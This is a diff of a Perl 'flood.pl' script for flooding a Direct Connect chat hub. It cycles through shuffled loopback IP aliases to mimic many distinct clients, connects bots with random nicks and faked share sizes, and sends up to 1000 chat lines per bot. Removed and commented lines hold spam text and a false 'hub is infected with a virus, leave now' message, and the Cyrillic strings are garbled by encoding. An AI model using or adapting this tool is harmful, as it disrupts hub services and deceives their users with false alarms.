@@ -25,36 +25,63 @@ use strict;
 eval { use Time::HiRes qw(time sleep); };
 use lib './lib';
 use dcppp::clihub;
+
+sub fisher_yates_shuffle {
+  my $deck = shift;    # $deck is a reference to an array
+    my $i    = @$deck;
+      while ( $i-- ) {
+          my $j = int rand( $i + 1 );
+	      @$deck[ $i, $j ] = @$deck[ $j, $i ];
+	        }
+		  return $deck;
+		  }
+		  
+
 print("usage: flood.pl [dchub://]host[:port] [bot_nick]\n"), exit if !$ARGV[0];
 $ARGV[0] =~ m|^(?:dchub\://)?(.+?)(?:\:(\d+))?$|;
 
-for my $ipc ( 230 .. 250 ) {
-  for my $ipd ( 1 .. 254 ) {
-    print `ifconfig lo0 alias 10.131.$ipc.$ipd/24`;
+for my $ipc ( map { @$_}fisher_yates_shuffle( [230 .. 250]) ) {
+  for my $ipd (map { @$_}  fisher_yates_shuffle([1 .. 254]) ) {
+  print "if create 10.131.$ipc.$ipd\n";
+    print `ifconfig lo1 alias 10.131.$ipc.$ipd/32`;
+  print "ok\n";
+
     my $dc = dcppp::clihub->new(
       'host' => $1,
       ( $2 ? ( 'port' => $2 ) : () ),
-      'Nick' => ( $ARGV[1] or int( rand(100000000) ) ),
+      'Nick' => ( $ARGV[1] or 'z'.int( rand(100000000) ) ).'x',
 
       #   'Nick'		=>	'xxxx',
-      'sharesize' => int( rand 1000000000000 ) + int( rand 100000000000 ) * int( rand 100 ),
+      'sharesize' => int( rand 100000000000 ) + int( rand 100000000000 ) * int( rand 100 ),
 
       #   'log'		=>	sub {},	# no logging
+#    'log'		=>	sub {return if $_[0] =~ /dbg|dmp/},	# no logging
       #   'min_chat_delay'	=> 0.401,
       #   'min_cmd_delay'	=> 0.401,
       'client'      => '++',
-      'V'           => '0.698',
+      'V'           => '0.697',
       'description' => '',
       'M'           => 'P',
       'sockopts'    => { 'LocalAddr' => "10.131.$ipc.$ipd" },
     );
+next if !$dc->{'socket'};
+#      $dc->cmd( 'chatline', 'ƒоброго времени суток! ѕользу€сь случаем, хотим сказать вам: ¬џ Ё@3Ѕ@Ћ» —ѕјћ»“№!' );
+    $dc->recv(),sleep(1) for (1..5);    #sleep(5); $dc->recv();
+
+   for (1..1000) {
+last if !$dc->{'socket'};
     print("BOT SEND all\n"),
-      $dc->cmd( 'chatline', 'ƒоброго времени суток! ѕользу€сь случаем, хотим сказать вам: ¬џ Ё@3Ѕ@Ћ» —ѕјћ»“№!' );
-    print("BOT SEND to $_\n"), $dc->cmd( 'To', $_, 'RAT HUB заражен вирусом срочно покиньте его!' )
-      for keys %{ $dc->{'NickList'} };
+#      $dc->cmd( 'chatline', 'Ќа–оƒ, ѕр»гЋаЎа≈м ¬а— Ќа ѕр»кќл№нџй хјб 10. 139. 24 .136  !!! ¬аћ ¬с≈гƒа –аƒ HUB -=NEW-CITY=-, Ќе «аЅуƒь“е ƒоЅа¬и“ь в »зЅрјннќе!!' );
+      $dc->cmd( 'chatline', $_ );
+#    sleep(1);
+}
+#    print("BOT SEND to $_\n"), $dc->cmd( 'To', $_, 'HUB за ражен виру сом сро чно поки ньте его!' )
+#      for keys %{ $dc->{'NickList'} };
     $dc->recv();    #sleep(5); $dc->recv();
     $dc->destroy();
     sleep(2);
-    print `ifconfig lo0 -alias 10.131.$ipc.$ipd/24`;
+  print "if del 10.131.$ipc.$ipd\n";
+    print `ifconfig lo1  10.131.$ipc.$ipd/32 -alias`;
+  print "ok\n";
   }
 }
